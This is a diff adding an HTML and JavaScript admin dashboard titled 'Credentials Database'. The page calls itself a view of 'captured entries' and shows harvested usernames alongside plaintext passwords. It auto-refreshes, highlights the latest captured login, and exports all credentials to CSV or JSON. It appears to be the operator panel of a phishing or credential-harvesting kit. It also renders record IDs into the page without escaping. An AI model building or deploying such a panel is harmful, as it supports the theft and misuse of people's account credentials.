@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - Database View</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #080c14;
+      --card: rgba(15, 23, 42, 0.8);
+      --border: rgba(255,255,255,0.07);
+      --text: #f1f5f9;
+      --muted: #64748b;
+      --primary: #3b82f6;
+      --primary-dark: #1d4ed8;
+      --success: #10b981;
+      --danger: #ef4444;
+      --input-bg: rgba(30,41,59,0.6);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      min-height: 100vh;
+      background-color: var(--bg);
+      background-image:
+        radial-gradient(ellipse at 10% 10%, rgba(59,130,246,0.12) 0, transparent 55%),
+        radial-gradient(ellipse at 90% 90%, rgba(16,185,129,0.08) 0, transparent 55%);
+      font-family: 'Inter', sans-serif;
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+    }
+    body { padding: 40px 20px; display: flex; justify-content: center; }
+    .dashboard { width: 100%; max-width: 1240px; display: flex; flex-direction: column; gap: 28px; }
+
+    /* === HEADER === */
+    header {
+      display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 16px;
+      padding-bottom: 24px; border-bottom: 1px solid var(--border);
+    }
+    .brand { display: flex; align-items: center; gap: 14px; }
+    .brand-icon {
+      width: 44px; height: 44px; border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary), var(--success));
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px; font-weight: 800; color: #fff;
+      box-shadow: 0 4px 20px rgba(59,130,246,0.35);
+    }
+    .brand h1 { font-size: 22px; font-weight: 700; letter-spacing: -0.4px; }
+    .brand p { font-size: 12px; color: var(--muted); margin-top: 2px; }
+    .header-controls { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+    .api-row {
+      display: flex; align-items: center; gap: 8px;
+      background: var(--input-bg); border: 1px solid var(--border);
+      border-radius: 8px; padding: 6px 12px; font-size: 13px;
+    }
+    .api-row label { color: var(--muted); font-weight: 600; white-space: nowrap; font-size: 11px; letter-spacing: 0.5px; text-transform: uppercase; }
+    .api-row input { background: transparent; border: none; color: var(--text); outline: none; font-family: monospace; font-size: 13px; width: 230px; }
+
+    /* === BUTTONS === */
+    .btn {
+      display: inline-flex; align-items: center; gap: 7px;
+      padding: 9px 16px; border-radius: 8px; font-size: 13px;
+      font-weight: 500; cursor: pointer; border: none;
+      transition: all 0.2s ease; font-family: 'Inter', sans-serif;
+    }
+    .btn-primary { background: var(--primary); color: #fff; }
+    .btn-primary:hover { background: var(--primary-dark); transform: translateY(-1px); }
+    .btn-ghost { background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: var(--text); }
+    .btn-ghost:hover { background: rgba(255,255,255,0.12); transform: translateY(-1px); }
+    .btn-icon { padding: 9px 10px; }
+    .btn:active { transform: translateY(0); }
+
+    /* === STATS === */
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px,1fr)); gap: 18px; }
+    .stat-card {
+      background: var(--card); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 16px; padding: 24px;
+      position: relative; overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+      transition: transform 0.2s;
+    }
+    .stat-card:hover { transform: translateY(-2px); }
+    .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--primary); }
+    .stat-card.online::before { background: var(--success); }
+    .stat-card.offline::before { background: var(--danger); }
+    .stat-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.7px; color: var(--muted); margin-bottom: 12px; }
+    .stat-value { font-size: 34px; font-weight: 700; letter-spacing: -1.5px; line-height: 1; }
+    .stat-sub { font-size: 12px; color: var(--muted); margin-top: 8px; }
+    .badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 12px; font-weight: 600; padding: 4px 10px; border-radius: 20px;
+    }
+    .badge.online { background: rgba(16,185,129,0.15); color: var(--success); }
+    .badge.offline { background: rgba(239,68,68,0.15); color: var(--danger); }
+
+    /* === MAIN CARD === */
+    .main-card {
+      background: var(--card); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 16px; padding: 28px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 20px;
+    }
+    .table-controls { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 14px; }
+    .search-wrap { position: relative; flex: 1; min-width: 260px; max-width: 440px; }
+    .search-wrap svg { position: absolute; left: 13px; top: 50%; transform: translateY(-50%); color: var(--muted); pointer-events: none; }
+    .search-input {
+      width: 100%; padding: 11px 14px 11px 40px;
+      background: var(--input-bg); border: 1px solid var(--border);
+      border-radius: 8px; color: var(--text); font-size: 14px;
+      outline: none; transition: border-color 0.2s; font-family: 'Inter', sans-serif;
+    }
+    .search-input:focus { border-color: var(--primary); }
+    .toolbar { display: flex; align-items: center; gap: 10px; }
+    .toggle-label { display: flex; align-items: center; gap: 7px; font-size: 13px; color: var(--muted); cursor: pointer; user-select: none; }
+
+    /* === TABLE === */
+    .table-wrap { overflow-x: auto; border-radius: 10px; border: 1px solid var(--border); }
+    table { width: 100%; border-collapse: collapse; font-size: 14px; }
+    thead th {
+      background: rgba(255,255,255,0.025); padding: 14px 18px;
+      font-size: 11px; font-weight: 600; text-transform: uppercase;
+      letter-spacing: 0.6px; color: var(--muted);
+      border-bottom: 1px solid var(--border); cursor: pointer; user-select: none;
+      white-space: nowrap;
+    }
+    thead th:hover { background: rgba(255,255,255,0.06); color: var(--text); }
+    thead th.no-sort { cursor: default; }
+    thead th.no-sort:hover { background: rgba(255,255,255,0.025); color: var(--muted); }
+    tbody td { padding: 14px 18px; border-bottom: 1px solid var(--border); vertical-align: middle; font-family: monospace; font-size: 13px; }
+    tbody tr:last-child td { border-bottom: none; }
+    tbody tr { transition: background 0.15s; }
+    tbody tr:hover td { background: rgba(255,255,255,0.025); }
+    .cell-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; min-width: 160px; }
+    .cell-actions { display: flex; gap: 4px; flex-shrink: 0; }
+    .icon-btn {
+      background: transparent; border: none; color: var(--muted);
+      cursor: pointer; padding: 5px; border-radius: 5px;
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.2s;
+    }
+    .icon-btn:hover { color: var(--primary); background: rgba(59,130,246,0.1); }
+    .masked { font-family: sans-serif; letter-spacing: 4px; font-size: 13px; }
+    .id-badge {
+      display: inline-block; font-size: 11px; color: var(--muted);
+      background: rgba(255,255,255,0.05); border-radius: 5px;
+      padding: 3px 8px; font-family: monospace;
+      max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    }
+
+    /* === EMPTY STATE === */
+    .empty-state {
+      padding: 60px 24px; text-align: center; color: var(--muted);
+      display: none; flex-direction: column; align-items: center; gap: 14px;
+    }
+    .empty-state svg { opacity: 0.4; }
+    .empty-state h3 { font-size: 18px; color: var(--text); }
+
+    /* === TOAST === */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--success); color: #fff; padding: 12px 20px;
+      border-radius: 10px; font-size: 14px; font-weight: 500;
+      opacity: 0; transform: translateY(16px);
+      transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+      pointer-events: none; z-index: 9999;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* === ANIMATIONS === */
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinning { animation: spin 0.7s linear; }
+
+    @media (max-width: 640px) {
+      body { padding: 20px 12px; }
+      .main-card { padding: 16px; }
+      .api-row input { width: 150px; }
+    }
+  </style>
+</head>
+<body>
+<div class="dashboard">
+
+  <!-- Header -->
+  <header>
+    <div class="brand">
+      <div class="brand-icon">X</div>
+      <div>
+        <h1>Credentials Database</h1>
+        <p>Admin view &mdash; captured entries from db.json</p>
+      </div>
+    </div>
+    <div class="header-controls">
+      <!-- API input removed as URL is now hardcoded -->
+      <button id="refreshBtn" class="btn btn-ghost btn-icon" title="Refresh now">
+        <svg id="refreshIcon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21.5 2v6h-6"/><path d="M21.34 15.57a10 10 0 1 1-.57-8.38"/>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- Stats -->
+  <section class="stats">
+    <div id="statusCard" class="stat-card offline">
+      <div class="stat-label">Server Status</div>
+      <div><span id="statusBadge" class="badge offline">● Offline</span></div>
+      <div class="stat-sub" id="statusSub">Not connected</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Total Signups</div>
+      <div class="stat-value" id="totalCount">0</div>
+      <div class="stat-sub">Records in database</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Latest Captured</div>
+      <div id="latestUser" style="font-size:18px;font-family:monospace;padding-top:8px;min-height:44px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">—</div>
+      <div class="stat-sub" id="latestSub">Waiting for data...</div>
+    </div>
+  </section>
+
+  <!-- Main table card -->
+  <main class="main-card">
+    <div class="table-controls">
+      <div class="search-wrap">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+        <input id="searchInput" class="search-input" type="text" placeholder="Search by username, password or ID...">
+      </div>
+      <div class="toolbar">
+        <label class="toggle-label">
+          <input type="checkbox" id="autoRefresh" checked>
+          Auto-refresh (5s)
+        </label>
+        <button id="exportCsv" class="btn btn-ghost">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          CSV
+        </button>
+        <button id="exportJson" class="btn btn-ghost">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          JSON
+        </button>
+      </div>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th id="th-id"># ID</th>
+            <th id="th-user">Username</th>
+            <th class="no-sort">Password</th>
+          </tr>
+        </thead>
+        <tbody id="tableBody"></tbody>
+      </table>
+      <div class="empty-state" id="emptyState">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+        <h3>No records found</h3>
+        <p>Make sure the server is running and the API URL is correct.</p>
+      </div>
+    </div>
+  </main>
+
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+  const $ = id => document.getElementById(id);
+  let users = [], showPass = {}, sortKey = 'id', sortDir = 'desc', refreshTimer = null;
+
+  const searchEl   = $('searchInput');
+  const tbody      = $('tableBody');
+  const emptyEl    = $('emptyState');
+  const totalEl    = $('totalCount');
+  const latestEl   = $('latestUser');
+  const latestSub  = $('latestSub');
+  const statusCard = $('statusCard');
+  const statusBadge= $('statusBadge');
+  const statusSub  = $('statusSub');
+  const refreshBtn = $('refreshBtn');
+  const refreshIcon= $('refreshIcon');
+  const autoChk    = $('autoRefresh');
+  const toast      = $('toast');
+
+  // Toast helper
+  function showToast(msg, error = false) {
+    toast.textContent = msg;
+    toast.style.background = error ? '#ef4444' : '#10b981';
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2200);
+  }
+
+  const API_ENDPOINT = "/api/data";
+
+  // Fetch data from the backend
+  async function fetchData() {
+    refreshIcon.classList.add('spinning');
+    setTimeout(() => refreshIcon.classList.remove('spinning'), 700);
+
+    try {
+      const targetUrl = API_ENDPOINT;
+      const res = await fetch(targetUrl);
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      const data = await res.json();
+
+      if (Array.isArray(data)) users = data;
+      else users = [];
+
+      setStatus(true);
+      render();
+    } catch (e) {
+      setStatus(false, e.message);
+    }
+  }
+
+  // Delete data
+  async function deleteUser(id) {
+    if (!confirm('Are you sure you want to delete this user?')) return;
+
+    try {
+      const targetUrl = `${API_ENDPOINT}/${id}`;
+      const res = await fetch(targetUrl, { method: 'DELETE' });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      showToast('User deleted successfully');
+      fetchData();
+    } catch (e) {
+      showToast('Failed to delete user', true);
+    }
+  }
+
+  function setStatus(online, msg = '') {
+    statusCard.className = 'stat-card ' + (online ? 'online' : 'offline');
+    statusBadge.className = 'badge ' + (online ? 'online' : 'offline');
+    statusBadge.textContent = online ? '● Online' : '● Offline';
+    statusSub.textContent = online
+      ? 'Connected at ' + new Date().toLocaleTimeString()
+      : (msg || 'Cannot reach server');
+  }
+
+  function render() {
+    const q = searchEl.value.toLowerCase();
+
+    let list = users.filter(u =>
+      String(u.username || '').toLowerCase().includes(q) ||
+      String(u.password || '').toLowerCase().includes(q) ||
+      String(u.id || '').toLowerCase().includes(q)
+    );
+
+    // Sort
+    list.sort((a, b) => {
+      let av = a[sortKey], bv = b[sortKey];
+      if (sortKey === 'id') {
+        const an = parseInt(av, 10), bn = parseInt(bv, 10);
+        if (!isNaN(an) && !isNaN(bn)) { av = an; bv = bn; }
+        else { av = String(av || ''); bv = String(bv || ''); }
+      } else {
+        av = String(av || '').toLowerCase();
+        bv = String(bv || '').toLowerCase();
+      }
+      return sortDir === 'asc' ? (av < bv ? -1 : av > bv ? 1 : 0) : (av > bv ? -1 : av < bv ? 1 : 0);
+    });
+
+    // Stats
+    totalEl.textContent = users.length;
+    if (users.length > 0) {
+      const sorted = [...users].sort((a,b) => {
+        const an = parseInt(a.id,10), bn = parseInt(b.id,10);
+        return isNaN(an)||isNaN(bn) ? String(a.id).localeCompare(String(b.id)) : an-bn;
+      });
+      const newest = sorted[sorted.length - 1];
+      latestEl.textContent = newest.username || 'N/A';
+      latestEl.title = newest.username || '';
+      latestSub.textContent = 'ID: ' + newest.id;
+    }
+
+    // Column headers
+    $('th-id').innerHTML = 'ID' + (sortKey === 'id' ? (sortDir === 'asc' ? ' ↑' : ' ↓') : '');
+    $('th-user').innerHTML = 'Username' + (sortKey === 'username' ? (sortDir === 'asc' ? ' ↑' : ' ↓') : '');
+
+    tbody.innerHTML = '';
+    if (list.length === 0) { emptyEl.style.display = 'flex'; return; }
+    emptyEl.style.display = 'none';
+
+    list.forEach(u => {
+      const tr = document.createElement('tr');
+      const uid = String(u.id || '');
+      const visible = showPass[uid] === true;
+
+      tr.innerHTML = `
+        <td><span class="id-badge" title="${uid}">${uid}</span></td>
+        <td>
+          <div class="cell-row">
+            <span>${escHtml(u.username || '')}</span>
+            <div class="cell-actions">
+              <button class="icon-btn" title="Copy username" onclick="copy(${JSON.stringify(u.username || '')})">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              </button>
+            </div>
+          </div>
+        </td>
+        <td>
+          <div class="cell-row">
+            <span class="${visible ? '' : 'masked'}">${visible ? escHtml(u.password || '') : '••••••••'}</span>
+            <div class="cell-actions">
+              <button class="icon-btn" title="${visible ? 'Hide' : 'Show'}" onclick="togglePass(${JSON.stringify(uid)})">
+                ${visible
+                  ? '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'
+                  : '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>'
+                }
+              </button>
+              <button class="icon-btn" title="Copy password" onclick="copy(${JSON.stringify(u.password || '')})">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              </button>
+              <button class="icon-btn" title="Delete user" onclick="deleteUser(${JSON.stringify(uid)})">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path><line x1="10" y1="11" x2="10" y2="17"></line><line x1="14" y1="11" x2="14" y2="17"></line></svg>
+              </button>
+            </div>
+          </div>
+        </td>`;
+      tbody.appendChild(tr);
+    });
+  }
+
+  function escHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  function togglePass(id) { showPass[id] = !showPass[id]; render(); }
+
+  async function copy(txt) {
+    try { await navigator.clipboard.writeText(txt); showToast('Copied!'); }
+    catch { showToast('Copy failed', true); }
+  }
+
+  // Sort
+  $('th-id').addEventListener('click', () => { sortDir = sortKey === 'id' ? (sortDir === 'asc' ? 'desc' : 'asc') : 'desc'; sortKey = 'id'; render(); });
+  $('th-user').addEventListener('click', () => { sortDir = sortKey === 'username' ? (sortDir === 'asc' ? 'desc' : 'asc') : 'asc'; sortKey = 'username'; render(); });
+
+  searchEl.addEventListener('input', render);
+  refreshBtn.addEventListener('click', fetchData);
+
+  // Auto refresh
+  function setupRefresh() {
+    clearInterval(refreshTimer);
+    if (autoChk.checked) refreshTimer = setInterval(fetchData, 5000);
+  }
+  autoChk.addEventListener('change', setupRefresh);
+
+  // Export CSV
+  $('exportCsv').addEventListener('click', () => {
+    if (!users.length) { showToast('No data to export', true); return; }
+    let csv = 'ID,Username,Password\n';
+    users.forEach(u => {
+      csv += `"${String(u.id||'').replace(/"/g,'""')}","${String(u.username||'').replace(/"/g,'""')}","${String(u.password||'').replace(/"/g,'""')}"\n`;
+    });
+    download(csv, 'credentials_' + today() + '.csv', 'text/csv');
+    showToast('CSV exported!');
+  });
+
+  // Export JSON
+  $('exportJson').addEventListener('click', () => {
+    if (!users.length) { showToast('No data to export', true); return; }
+    download(JSON.stringify({ users }, null, 2), 'credentials_' + today() + '.json', 'application/json');
+    showToast('JSON exported!');
+  });
+
+  function download(content, filename, type) {
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([content], { type }));
+    a.download = filename;
+    a.click();
+  }
+
+  function today() { return new Date().toISOString().split('T')[0]; }
+
+  // Refresh on tab focus
+  document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') fetchData(); });
+
+  // Init
+  fetchData();
+  setupRefresh();
+</script>
+</body>
+</html>
